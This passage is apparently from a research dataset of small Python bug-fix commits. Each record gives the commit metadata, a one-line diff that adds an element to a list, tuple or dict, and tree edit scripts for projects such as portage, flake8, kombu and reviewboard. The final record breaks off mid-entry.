{"project": "portage", "commit_sha": "3d2fe9e85f250fa294fe38b66ec642eb457e66a5", "parent_sha": "2c49c1c39729c7c6947a9c4d8ad078224c53b9a7", "file_path": "pym/portage/tests/resolver/test_slot_collisions.py", "project_url": "https://github.com/UNIVERSAL-IT-SYSTEMS/portage", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -19,7 +19,7 @@ class SlotCollisionTestCase(TestCase):\n \t\t\t\"app-misc/Y-1\": { \"DEPEND\": \"=app-misc/Z-1\" },\n \t\t\t\"app-misc/X-1\": { \"DEPEND\": \"=app-misc/Z-2\" },\n \n-\t\t\t\"sci-libs/K-1\": { \"IUSE\": \"+foo\" },\n+\t\t\t\"sci-libs/K-1\": { \"IUSE\": \"+foo\", \"EAPI\": 1 },\n \t\t\t\"sci-libs/L-1\": { \"DEPEND\": \"sci-libs/K[-foo]\", \"EAPI\": 2 },\n \t\t\t\"sci-libs/M-1\": { \"DEPEND\": \"sci-libs/K[foo=]\", \"IUSE\": \"+foo\", \"EAPI\": 2 },\n \t\t\t}\n", "before": "{ \"IUSE\" : \"+foo\" } ,", "after": "{ \"IUSE\" : \"+foo\" , \"EAPI\" : 1 } ,", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"dictionary\", 3, 20, 3, 38], [\",:,\", \"T\"], 2], [\"Insert\", [\"dictionary\", 3, 20, 3, 38], [\"pair\", \"N0\"], 3], [\"Insert\", \"N0\", [\"string:\\\"EAPI\\\"\", \"T\"], 0], [\"Insert\", \"N0\", [\":::\", \"T\"], 1], [\"Insert\", \"N0\", [\"integer:1\", \"T\"], 2]]"}
{"project": "ESP-Website-1", "commit_sha": "ab53d76d19ce3fe0b4ca539754b88b4cff4a6893", "parent_sha": "2e30ebec35c72b96481e99675bf84f6b790d1bbc", "file_path": "esp/esp/web/templatetags/main.py", "project_url": "https://github.com/UNIVERSAL-IT-SYSTEMS/ESP-Website-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -6,7 +6,7 @@ def mux_tl(str,type):\n     splitstr = str.split(\"/\") # String should be of the format \"/learn/foo/bar/index.html\"\n     if len(splitstr) < 2 or splitstr[0] != \"\":\n         return str\n-    elif splitstr[1] in (\"teach\", \"learn\", \"manage\", \"onsite\"):\n+    elif splitstr[1] in (\"teach\", \"learn\", \"manage\", \"onsite\", \"volunteer\"):\n         return (\"/%s/\" % type) + \"/\".join(splitstr[2:])\n     else:\n         return str\n", "before": "if len ( splitstr ) < 2 or splitstr [ 0 ] != \"\" : return str elif splitstr [ 1 ] in ( \"teach\" , \"learn\" , \"manage\" , \"onsite\" ) : return ( \"/%s/\" % type ) + \"/\" . join ( splitstr [ 2 : ] ) else : return str", "after": "if len ( splitstr ) < 2 or splitstr [ 0 ] != \"\" : return str elif splitstr [ 1 ] in ( \"teach\" , \"learn\" , \"manage\" , \"onsite\" , \"volunteer\" ) : return ( \"/%s/\" % type ) + \"/\" . join ( splitstr [ 2 : ] ) else : return str", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"tuple\", 3, 25, 3, 63], [\",:,\", \"T\"], 8], [\"Insert\", [\"tuple\", 3, 25, 3, 63], [\"string:\\\"volunteer\\\"\", \"T\"], 9]]"}
{"project": "flake8", "commit_sha": "4c0b1cd5e180b2c5a7ea31eeff083d64d9fdf6b8", "parent_sha": "27dbd61f125a048612890d1d0c2ef0dd3f52df7d", "file_path": "tests/integration/test_aggregator.py", "project_url": "https://github.com/UNIVERSAL-IT-SYSTEMS/flake8", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -43,6 +43,6 @@ def test_aggregate_options_when_isolated(optmanager):\n     assert options.isolated is True\n     assert options.select == ['E11', 'E34', 'E402', 'W', 'F']\n     assert sorted(options.ignore) == [\n-        'E121', 'E123', 'E126', 'E226', 'E24', 'E704', 'E8',\n+        'E121', 'E123', 'E126', 'E226', 'E24', 'E704', 'E8', 'W503', 'W504',\n     ]\n     assert options.exclude == [os.path.abspath('tests/*')]\n", "before": "assert sorted ( options . ignore ) == [ 'E121' , 'E123' , 'E126' , 'E226' , 'E24' , 'E704' , 'E8' , ]", "after": "assert sorted ( options . ignore ) == [ 'E121' , 'E123' , 'E126' , 'E226' , 'E24' , 'E704' , 'E8' , 'W503' , 'W504' , ]", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"list\", 2, 38, 4, 6], [\"string:'W503'\", \"T\"], 15], [\"Insert\", [\"list\", 2, 38, 4, 6], [\",:,\", \"T\"], 16], [\"Insert\", [\"list\", 2, 38, 4, 6], [\"string:'W504'\", \"T\"], 17], [\"Insert\", [\"list\", 2, 38, 4, 6], [\",:,\", \"T\"], 18]]"}
{"project": "BinaryBuilder", "commit_sha": "b7039e3e1e3c1155e9031bc8c7b867d9a213aa65", "parent_sha": "4547d1893ec1fd4998f7e9a97a9d77ccbf2f299f", "file_path": "Packages.py", "project_url": "https://github.com/UNIVERSAL-IT-SYSTEMS/BinaryBuilder", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -439,7 +439,7 @@ class ufconfig(Package):\n         link_cmd = [self.env['CC']] + self.env['LDFLAGS'].split(' ')\n         link_cmd += ['-shared','UFconfig.lo']\n         if self.arch.os == 'osx':\n-            link_cmd.extend(['-Wl,-install_name,libufconfig.3.6.1.dylib','-o','libufconfig.3.6.1.dylib'])\n+            link_cmd.extend(['-dynamiclib','-Wl,-install_name,libufconfig.3.6.1.dylib','-o','libufconfig.3.6.1.dylib'])\n         else:\n             link_cmd.extend(['-Wl,-soname,libufconfig.so.3.6.1','-o','libufconfig.so.3.6.1'])\n         self.helper(*link_cmd)\n", "before": "link_cmd . extend ( [ '-Wl,-install_name,libufconfig.3.6.1.dylib' , '-o' , 'libufconfig.3.6.1.dylib' ] )", "after": "link_cmd . extend ( [ '-dynamiclib' , '-Wl,-install_name,libufconfig.3.6.1.dylib' , '-o' , 'libufconfig.3.6.1.dylib' ] )", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Move\", [\"string:'-o'\", 3, 74, 3, 78], [\"list\", 3, 29, 3, 105], 3], [\"Insert\", [\"list\", 3, 29, 3, 105], [\"string:'-dynamiclib'\", \"T\"], 1], [\"Insert\", [\"list\", 3, 29, 3, 105], [\",:,\", \"T\"], 2], [\"Insert\", [\"list\", 3, 29, 3, 105], [\",:,\", \"T\"], 7], [\"Delete\", [\",:,\", 3, 73, 3, 74]]]"}
{"project": "BinaryBuilder", "commit_sha": "5976f1981ced218cedf2bd44afd8df5c6c4dc77b", "parent_sha": "e69f6ce7cc98ed7395618b4cb07c65c417ccbbbd", "file_path": "Packages.py", "project_url": "https://github.com/UNIVERSAL-IT-SYSTEMS/BinaryBuilder", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -802,5 +802,5 @@ class flann(CMakePackage):\n     patches = 'patches/flann'\n \n     def configure(self):\n-        super(flann, self).configure(other=['-DBUILD_C_BINDINGS=OFF','-DBUILD_MATLAB_BINDINGS=OFF','-DBUILD_PYTHON_BINDINGS=OFF'])\n+        super(flann, self).configure(other=['-DBUILD_C_BINDINGS=OFF','-DBUILD_MATLAB_BINDINGS=OFF','-DBUILD_PYTHON_BINDINGS=OFF','-DBUILD_CUDA_LIB=OFF'])\n \n", "before": "super ( flann , self ) . configure ( other = [ '-DBUILD_C_BINDINGS=OFF' , '-DBUILD_MATLAB_BINDINGS=OFF' , '-DBUILD_PYTHON_BINDINGS=OFF' ] )", "after": "super ( flann , self ) . configure ( other = [ '-DBUILD_C_BINDINGS=OFF' , '-DBUILD_MATLAB_BINDINGS=OFF' , '-DBUILD_PYTHON_BINDINGS=OFF' , '-DBUILD_CUDA_LIB=OFF' ] )", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"list\", 3, 44, 3, 130], [\",:,\", \"T\"], 6], [\"Insert\", [\"list\", 3, 44, 3, 130], [\"string:'-DBUILD_CUDA_LIB=OFF'\", \"T\"], 7]]"}
{"project": "BinaryBuilder", "commit_sha": "70b000bbe67898ad93e70baf257ad23534944441", "parent_sha": "c0ceed9f36282ef443a4a85433a194f2ba578f18", "file_path": "Packages.py", "project_url": "https://github.com/UNIVERSAL-IT-SYSTEMS/BinaryBuilder", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -354,7 +354,7 @@ class isis(Package):\n \n         # Fetch the ISIS version. We will rebuild it each time\n         # the version changes.\n-        cmd = ['rsync', self.isis_src +'version']\n+        cmd = ['rsync', self.isis_src +'version', '.']\n         self.helper(*cmd)\n         f = open('version','r')\n         self.chksum = f.readline().strip()\n", "before": "cmd = [ 'rsync' , self . isis_src + 'version' ]", "after": "cmd = [ 'rsync' , self . isis_src + 'version' , '.' ]", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"list\", 3, 15, 3, 50], [\",:,\", \"T\"], 4], [\"Insert\", [\"list\", 3, 15, 3, 50], [\"string:'.'\", \"T\"], 5]]"}
{"project": "tailon", "commit_sha": "d2b5cb16991c8905ce51e3ef44535e3d07023678", "parent_sha": "c9a8cfaeb28cfc1edc6cea3578573c3afa2dbd5c", "file_path": "tailon/server.py", "project_url": "https://github.com/devsisters/tailon", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -39,7 +39,7 @@ class Commands:\n         return p\n \n     def grep(self, regex, fn, stdout, stderr, **kw):\n-        cmd = [self.grepexe, '--line-buffered', '--color=never', '-e', regex]\n+        cmd = [self.grepexe, '--text', '--line-buffered', '--color=never', '-e', regex]\n         if fn:\n             cmd.append(fn)\n         p = Subprocess(cmd, stdout=stdout, stderr=stderr, **kw)\n", "before": "cmd = [ self . grepexe , '--line-buffered' , '--color=never' , '-e' , regex ]", "after": "cmd = [ self . grepexe , '--text' , '--line-buffered' , '--color=never' , '-e' , regex ]", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"list\", 3, 15, 3, 78], [\"string:'--text'\", \"T\"], 3], [\"Insert\", [\"list\", 3, 15, 3, 78], [\",:,\", \"T\"], 4]]"}
{"project": "django-envelope", "commit_sha": "2cbc197d703d15fe2d80101798d2281c55dd00ee", "parent_sha": "d5d2e3bb47f12d03fc05a950a4b5a9dbb0c9e805", "file_path": "envelope/forms.py", "project_url": "https://github.com/Akoten/django-envelope", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -194,6 +194,6 @@ class ContactForm(BaseContactForm):\n         try:\n             category = int(self.cleaned_data['category'])\n-        except (AttributeError, ValueError):\n+        except (AttributeError, ValueError, KeyError):\n             category = None\n         return dict(self.get_category_choices()).get(category)\n", "before": "try : category = int ( self . cleaned_data [ 'category' ] ) except ( AttributeError , ValueError ) : category = None", "after": "try : category = int ( self . cleaned_data [ 'category' ] ) except ( AttributeError , ValueError , KeyError ) : category = None", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"tuple\", 2, 16, 2, 44], [\",:,\", \"T\"], 4], [\"Insert\", [\"tuple\", 2, 16, 2, 44], [\"identifier:KeyError\", \"T\"], 5]]"}
{"project": "django-import-export", "commit_sha": "e1eddafe99a75adfe9a8d76bd5dfe7f2c9914f1a", "parent_sha": "59da8c82c608da98488e3ef50ba2799a05eb6cc3", "file_path": "import_export/resources.py", "project_url": "https://github.com/Akoten/django-import-export", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -545,7 +545,7 @@ class ModelResource(six.with_metaclass(ModelDeclarativeMetaclass, Resource)):\n             result = widgets.DateTimeWidget\n         elif internal_type in ('DateField', ):\n             result = widgets.DateWidget\n-        elif internal_type in ('IntegerField', 'PositiveIntegerField',\n+        elif internal_type in ('IntegerField', 'PositiveIntegerField', 'BigIntegerField',\n                 'PositiveSmallIntegerField', 'SmallIntegerField', 'AutoField'):\n             result = widgets.IntegerWidget\n         elif internal_type in ('BooleanField', 'NullBooleanField'):\n", "before": "internal_type in ( 'IntegerField' , 'PositiveIntegerField' , 'PositiveSmallIntegerField' , 'SmallIntegerField' , 'AutoField' ) : result = widgets . IntegerWidget", "after": "internal_type in ( 'IntegerField' , 'PositiveIntegerField' , 'BigIntegerField' , 'PositiveSmallIntegerField' , 'SmallIntegerField' , 'AutoField' ) : result = widgets . IntegerWidget", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Move\", [\",:,\", 3, 46, 3, 47], [\"tuple\", 3, 31, 4, 79], 5], [\"Insert\", [\"tuple\", 3, 31, 4, 79], [\",:,\", \"T\"], 2], [\"Insert\", [\"tuple\", 3, 31, 4, 79], [\"string:'BigIntegerField'\", \"T\"], 6], [\"Insert\", [\"tuple\", 3, 31, 4, 79], [\",:,\", \"T\"], 7], [\"Delete\", [\",:,\", 4, 44, 4, 45]]]"}
{"project": "django-mama-cas", "commit_sha": "fc9476f41ebec0cc41e7601176270272a7de9656", "parent_sha": "7aa28e35508b0cab7d61d9c39eb3af34d9d723a3", "file_path": "mama_cas/mixins.py", "project_url": "https://github.com/CodeArtLibs/django-mama-cas", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -135,7 +135,7 @@ class ValidateTicketMixin(object):\n         try:\n             pgt = ProxyGrantingTicket.objects.validate_ticket(pgt,\n                                                               target_service)\n-        except (InvalidRequestError, BadPGTError,\n+        except (InvalidRequestError, InvalidTicketError, BadPGTError,\n                 InvalidServiceError, InternalError) as e:\n             logger.warning(\"%s %s\" % (e.code, e))\n             return None, e\n", "before": "try : pgt = ProxyGrantingTicket . objects . validate_ticket ( pgt , target_service ) except ( InvalidRequestError , BadPGTError , InvalidServiceError , InternalError ) as e : logger . warning ( \"%s %s\" % ( e . code , e ) ) return None , e", "after": "try : pgt = ProxyGrantingTicket . objects . validate_ticket ( pgt , target_service ) except ( InvalidRequestError , InvalidTicketError , BadPGTError , InvalidServiceError , InternalError ) as e : logger . warning ( \"%s %s\" % ( e . code , e ) ) return None , e", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Move\", [\",:,\", 3, 36, 3, 37], [\"tuple\", 3, 16, 4, 52], 3], [\"Insert\", [\"tuple\", 3, 16, 4, 52], [\",:,\", \"T\"], 2], [\"Insert\", [\"tuple\", 3, 16, 4, 52], [\"identifier:InvalidTicketError\", \"T\"], 3], [\"Insert\", [\"tuple\", 3, 16, 4, 52], [\",:,\", \"T\"], 4], [\"Delete\", [\",:,\", 4, 36, 4, 37]]]"}
{"project": "pyudev", "commit_sha": "debcf080d96b7ec2dfffa75c91d5961946b98132", "parent_sha": "541121cf5a98c92dad5cc1e37da3efc1c6dc33a2", "file_path": "bootstrap_native_bindings.py", "project_url": "https://github.com/Outernet-Project/pyudev", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -88,7 +88,7 @@ def make_build(self, download_directory, target_directory):\n         archive = self.download(download_directory)\n         ext = os.path.splitext(archive)[1]\n         self.log.info('extracting %s to %s', archive, target_directory)\n-        self._check_call(['tar', '-x', '-a', archive,\n+        self._check_call(['tar', '-x', '-a', '-f', archive,\n                           '-C', target_directory])\n         return self.buildtype(os.path.join(\n             target_directory, '{0.name}-{0.version}'.format(self)))\n", "before": "self . _check_call ( [ 'tar' , '-x' , '-a' , archive , '-C' , target_directory ] )", "after": "self . _check_call ( [ 'tar' , '-x' , '-a' , '-f' , archive , '-C' , target_directory ] )", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Move\", [\",:,\", 3, 32, 3, 33], [\"list\", 3, 26, 4, 50], 7], [\"Insert\", [\"list\", 3, 26, 4, 50], [\",:,\", \"T\"], 2], [\"Insert\", [\"list\", 3, 26, 4, 50], [\"string:'-f'\", \"T\"], 8], [\"Insert\", [\"list\", 3, 26, 4, 50], [\",:,\", \"T\"], 9], [\"Delete\", [\",:,\", 4, 31, 4, 32]]]"}
{"project": "bcbio-nextgen", "commit_sha": "f676c331e80ca7dd6fc35ceb55415b49bb72d1e9", "parent_sha": "9c4467fb4fc458c4115a1fc8805cc0c5fed59d4f", "file_path": "bcbio/bam/trim.py", "project_url": "https://github.com/tenxcloud/bcbio-nextgen", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -191,7 +191,7 @@ def _cutadapt_trim(fastq_files, quality_format, adapters, out_files):\n     # this behavior might not be what we want; we could also do two or\n     # more passes of cutadapt\n     base_cmd = [\"cutadapt\", \"--times=\" + \"2\", \"--quality-base=\" + quality_base,\n-                \"--quality-cutoff=20\", \"--format=fastq\"]\n+                \"--quality-cutoff=20\", \"--format=fastq\", \"--minimum-length=0\"]\n     adapter_cmd = map(lambda x: \"--adapter=\" + x, adapters)\n     base_cmd.extend(adapter_cmd)\n \n", "before": "base_cmd = [ \"cutadapt\" , \"--times=\" + \"2\" , \"--quality-base=\" + quality_base , \"--quality-cutoff=20\" , \"--format=fastq\" ]", "after": "base_cmd = [ \"cutadapt\" , \"--times=\" + \"2\" , \"--quality-base=\" + quality_base , \"--quality-cutoff=20\" , \"--format=fastq\" , \"--minimum-length=0\" ]", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"list\", 2, 16, 3, 57], [\",:,\", \"T\"], 10], [\"Insert\", [\"list\", 2, 16, 3, 57], [\"string:\\\"--minimum-length=0\\\"\", \"T\"], 11]]"}
{"project": "reviewboard", "commit_sha": "137a6e1b1bf2abee9d5e06713297810803a6ac70", "parent_sha": "0d17696acfc60d67aef7807d1084346d399a514a", "file_path": "scmtools/perforce.py", "project_url": "https://github.com/iosphere/reviewboard", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -69,7 +69,7 @@ class PerforceTool(SCMTool):\n             file = '%s#%s' % (path, revision)\n \n         p = subprocess.Popen(\n-            ['p4', '-p', self.p4.port, '-u', self.p4.user, 'print', file],\n+            ['p4', '-p', self.p4.port, '-u', self.p4.user, 'print', '-q', file],\n             stdin=subprocess.PIPE, stdout=subprocess.PIPE,\n             stderr=subprocess.PIPE)\n \n", "before": "p = subprocess . Popen ( [ 'p4' , '-p' , self . p4 . port , '-u' , self . p4 . user , 'print' , file ] , stdin = subprocess . PIPE , stdout = subprocess . PIPE , stderr = subprocess . PIPE )", "after": "p = subprocess . Popen ( [ 'p4' , '-p' , self . p4 . port , '-u' , self . p4 . user , 'print' , '-q' , file ] , stdin = subprocess . PIPE , stdout = subprocess . PIPE , stderr = subprocess . PIPE )", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"list\", 3, 13, 3, 74], [\"string:'-q'\", \"T\"], 13], [\"Insert\", [\"list\", 3, 13, 3, 74], [\",:,\", \"T\"], 14]]"}
{"project": "kombu", "commit_sha": "fce718e9ae58d047ba743d492a7cd05a630b2692", "parent_sha": "70ddc1e837dd70b3e0996febf7e6eba1bc2e9ee7", "file_path": "kombu/utils/eventio.py", "project_url": "https://github.com/urbn/kombu", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -83,7 +83,7 @@ class _epoll(Poller):\n     def unregister(self, fd):\n         try:\n             self._epoll.unregister(fd)\n-        except (socket.error, ValueError, KeyError):\n+        except (socket.error, ValueError, KeyError, TypeError):\n             pass\n         except (IOError, OSError) as exc:\n             if get_errno(exc) != errno.ENOENT:\n", "before": "try : self . _epoll . unregister ( fd ) except ( socket . error , ValueError , KeyError ) : pass except ( IOError , OSError ) as exc : if get_errno ( exc ) != errno . ENOENT : ", "after": "try : self . _epoll . unregister ( fd ) except ( socket . error , ValueError , KeyError , TypeError ) : pass except ( IOError , OSError ) as exc : if get_errno ( exc ) != errno . ENOENT : ", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"tuple\", 3, 16, 3, 52], [\",:,\", \"T\"], 6], [\"Insert\", [\"tuple\", 3, 16, 3, 52], [\"identifier:TypeError\", \"T\"], 7]]"}
{"project": "Diamond", "commit_sha": "72c0a435f6f3c0b17f2f2975322b3f1103b2aadd", "parent_sha": "613cf64309dfc3e7fa2a79b2de5ff11f7d69ed1e", "file_path": "src/collectors/DiskSpaceCollector/TestDiskSpaceCollector.py", "project_url": "https://github.com/mopub/Diamond", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -51,7 +51,7 @@ none /var/lock tmpfs rw,nosuid,nodev,noexec,relatime 0 0\n             os_minor_mock.assert_called_once_with(42)\n \n             self.assertEqual(result, {\n-                (9, 0) : {'device' : '/dev/disk/by-uuid/81969733-a724-4651-9cf5-64970f86daba', 'mount_point' : '/'}\n+                (9, 0) : {'device' : '/dev/disk/by-uuid/81969733-a724-4651-9cf5-64970f86daba', 'fs_type': 'ext3', 'mount_point' : '/'}\n             })\n \n         open_mock.assert_called_once_with('/proc/mounts')\n", "before": "self . assertEqual ( result , { ( 9 , 0 ) : { 'device' : '/dev/disk/by-uuid/81969733-a724-4651-9cf5-64970f86daba' , 'mount_point' : '/' } } )", "after": "self . assertEqual ( result , { ( 9 , 0 ) : { 'device' : '/dev/disk/by-uuid/81969733-a724-4651-9cf5-64970f86daba' , 'fs_type' : 'ext3' , 'mount_point' : '/' } } )", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"dictionary\", 3, 26, 3, 116], [\"pair\", \"N0\"], 3], [\"Insert\", [\"dictionary\", 3, 26, 3, 116], [\",:,\", \"T\"], 4], [\"Insert\", \"N0\", [\"string:'fs_type'\", \"T\"], 0], [\"Insert\", \"N0\", [\":::\", \"T\"], 1], [\"Insert\", \"N0\", [\"string:'ext3'\", \"T\"], 2]]"}
{"project": "python-gnupg", "commit_sha": "8dcf49fa9570f5b495f7c11605f331dada70e3ee", "parent_sha": "0b9ee78d205c424d814008da1f714132cedc7458", "file_path": "gnupg/util.py", "project_url": "https://github.com/cotdsa/python-gnupg", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -140,7 +140,7 @@ def _is_file(input):\n     try:\n         assert os.lstat(input).st_size > 0, \"not a file: %s\" % input\n-    except (AssertionError, TypeError) as error:\n+    except (AssertionError, TypeError, IOError, OSError) as error:\n         logger.debug(error.message)\n         return False\n     else:\n", "before": "try : assert os . lstat ( input ) . st_size > 0 , \"not a file: %s\" % input except ( AssertionError , TypeError ) as error : logger . debug ( error . message ) return False else : ", "after": "try : assert os . lstat ( input ) . st_size > 0 , \"not a file: %s\" % input except ( AssertionError , TypeError , IOError , OSError ) as error : logger . debug ( error . message ) return False else : ", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"tuple\", 2, 12, 2, 39], [\",:,\", \"T\"], 4], [\"Insert\", [\"tuple\", 2, 12, 2, 39], [\"identifier:IOError\", \"T\"], 5], [\"Insert\", [\"tuple\", 2, 12, 2, 39], [\",:,\", \"T\"], 6], [\"Insert\", [\"tuple\", 2, 12, 2, 39], [\"identifier:OSError\", \"T\"], 7]]"}
{"project": "errbot", "commit_sha": "c9e0214171652873e82ebad7f74ca3d5cefe4863", "parent_sha": "9ef949b43773ee16650e3dfc91f3889bc0ec24f5", "file_path": "setup.py", "project_url": "https://github.com/cotdsa/errbot", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -71,7 +71,7 @@ def need_to_regenerate():\n \n def setup_python2():\n     from pip import main as mainpip\n-    mainpip(['install', '3to2'])\n+    mainpip(['install', '3to2', '--no-clean'])\n     from lib3to2 import main as three2two\n     import shutil\n     import shlex\n", "before": "mainpip ( [ 'install' , '3to2' ] )", "after": "mainpip ( [ 'install' , '3to2' , '--no-clean' ] )", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"list\", 3, 13, 3, 32], [\",:,\", \"T\"], 4], [\"Insert\", [\"list\", 3, 13, 3, 32], [\"string:'--no-clean'\", \"T\"], 5]]"}
{"project": "ftw.treeview", "commit_sha": "ec786d9ed94042a3768ef90fae86de575cd2c0e6", "parent_sha": "dc32a8847fa85dd0e1d554ea07e336e1f42df7a6", "file_path": "ftw/treeview/view.py", "project_url": "https://github.com/4teamwork/ftw.treeview", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -25,7 +25,7 @@ class TreeView(CatalogNavigationTree):\n \n         #XXX use querybuilder... \n         #query = queryBuilder()\n-        query = {'path': '/'.join(self.context.getPhysicalPath()), 'depth':1}\n+        query = {'path': '/'.join(self.context.getPhysicalPath()), 'depth':1, 'Type': 'RepositoryFolder'}\n         strategy = getMultiAdapter((context, self), INavtreeStrategy)\n         data = buildFolderTree(context, obj=context, query=query, strategy=strategy)\n         html=self.recurse(children=data.get('children', []),level=1, bottomLevel=999)\n", "before": "query = { 'path' : '/' . join ( self . context . getPhysicalPath ( ) ) , 'depth' : 1 }", "after": "query = { 'path' : '/' . join ( self . context . getPhysicalPath ( ) ) , 'depth' : 1 , 'Type' : 'RepositoryFolder' }", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"dictionary\", 3, 17, 3, 78], [\",:,\", \"T\"], 4], [\"Insert\", [\"dictionary\", 3, 17, 3, 78], [\"pair\", \"N0\"], 5], [\"Insert\", \"N0\", [\"string:'Type'\", \"T\"], 0], [\"Insert\", \"N0\", [\":::\", \"T\"], 1], [\"Insert\", \"N0\", [\"string:'RepositoryFolder'\", \"T\"], 2]]"}
{"project": "openobject-server", "commit_sha": "c5d900b16589f7ebbba193462cf36e7d21f17386", "parent_sha": "39985b3a937ba3ce9812822c035537e732daca26", "file_path": "bin/addons/base/res/partner/partner.py", "project_url": "https://github.com/gisce/openobject-server", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -166,7 +166,7 @@ class res_partner(osv.osv):\n     }\n     def copy(self, cr, uid, id, default=None, context={}):\n         name = self.read(cr, uid, [id], ['name'])[0]['name']\n-        default.update({'name': name+' (copy)'})\n+        default.update({'name': name+' (copy)', 'events':[]})\n         return super(res_partner, self).copy(cr, uid, id, default, context)\n \n     def _check_ean_key(self, cr, uid, ids):\n", "before": "default . update ( { 'name' : name + ' (copy)' } )", "after": "default . update ( { 'name' : name + ' (copy)' , 'events' : [ ] } )", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"dictionary\", 3, 24, 3, 48], [\",:,\", \"T\"], 2], [\"Insert\", [\"dictionary\", 3, 24, 3, 48], [\"pair\", \"N0\"], 3], [\"Insert\", \"N0\", [\"string:'events'\", \"T\"], 0], [\"Insert\", \"N0\", [\":::\", \"T\"], 1], [\"Insert\", \"N0\", [\"list\", \"N1\"], 2], [\"Insert\", \"N1\", [\"[:[\", \"T\"], 0], [\"Insert\", \"N1\", [\"]:]\", \"T\"], 1]]"}
{"project": "openobject-server", "commit_sha": "836af5d93371a9cbd5e1ce96cf288a2cbcea8bef", "parent_sha": "a978ab1bd9ff862d9bd84e1c1ba237df1b967d39", "file_path": "openerp/workflow/wkf_expr.py", "project_url": "https://github.com/gisce/openobject-server", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -60,7 +60,7 @@ def _eval_expr(cr, ident, workitem, action):\n \n def execute_action(cr, ident, workitem, activity):\n     obj = pooler.get_pool(cr.dbname).get('ir.actions.server')\n-    ctx = {'active_id':ident[2], 'active_ids':[ident[2]]}\n+    ctx = {'active_model':ident[1], 'active_id':ident[2], 'active_ids':[ident[2]]}\n     result = obj.run(cr, ident[0], [activity['action_id']], ctx)\n     return result\n \n", "before": "ctx = { 'active_id' : ident [ 2 ] , 'active_ids' : [ ident [ 2 ] ] }", "after": "ctx = { 'active_model' : ident [ 1 ] , 'active_id' : ident [ 2 ] , 'active_ids' : [ ident [ 2 ] ] }", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"dictionary\", 3, 11, 3, 58], [\"pair\", \"N0\"], 1], [\"Insert\", [\"dictionary\", 3, 11, 3, 58], [\",:,\", \"T\"], 2], [\"Insert\", \"N0\", [\"string:'active_model'\", \"T\"], 0], [\"Insert\", \"N0\", [\":::\", \"T\"], 1], [\"Insert\", \"N0\", [\"subscript\", \"N1\"], 2], [\"Insert\", \"N1\", [\"identifier:ident\", \"T\"], 0], [\"Insert\", \"N1\", [\"[:[\", \"T\"], 1], [\"Insert\", \"N1\", [\"integer:1\", \"T\"], 2], [\"Insert\", \"N1\", [\"]:]\", \"T\"], 3]]"}
{"project": "openobject-server", "commit_sha": "05edb3ec157b00bf2d9c0a89fbf2839cc5cca7df", "parent_sha": "38405ce51dbb04956023ae31ddefbaacbb457660", "file_path": "openerp/addons/base/res/res_partner.py", "project_url": "https://github.com/gisce/openobject-server", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -191,7 +191,7 @@ class res_partner(osv.osv):\n     \n     def onchange_type(self, cr, uid, ids, is_company, title, context=None):\n         if is_company == 'contact':\n-            return {'value': {'is_company': is_company, 'title': ''}}\n+            return {'value': {'is_company': is_company, 'title': '','child_ids':''}}\n         elif is_company == 'partner':\n             return {'value': {'is_company': is_company, 'title': ''}}\n         return {'value': {'is_comapny': '', 'title': ''}}\n", "before": "return { 'value' : { 'is_company' : is_company , 'title' : '' } }", "after": "return { 'value' : { 'is_company' : is_company , 'title' : '' , 'child_ids' : '' } }", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"dictionary\", 3, 30, 3, 69], [\",:,\", \"T\"], 4], [\"Insert\", [\"dictionary\", 3, 30, 3, 69], [\"pair\", \"N0\"], 5], 